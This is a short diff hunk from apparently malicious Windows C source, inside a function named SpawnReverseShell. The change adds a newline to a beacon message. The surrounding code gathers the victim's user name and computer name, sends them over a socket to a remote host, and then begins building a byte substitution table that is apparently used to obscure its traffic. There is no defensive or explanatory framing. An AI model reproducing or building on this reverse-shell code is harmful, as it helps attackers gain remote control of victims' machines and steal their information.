@@ -212,7 +212,7 @@ void SpawnReverseShell(char* ip, int port) {
         GetComputerNameA(hostname, &hSize);
         GetUserNameA(username, &uSize);
         char infoBuf[512];
-        snprintf(infoBuf, sizeof(infoBuf), "0info %s&%s", username, hostname);
+        snprintf(infoBuf, sizeof(infoBuf), "0info %s&%s\n", username, hostname);
         send(s, infoBuf, strlen(infoBuf), 0);
         for (int i = 0; i < 256; i++) sub_table[i] = (unsigned char)i;
         srand((unsigned int)time(NULL)); 
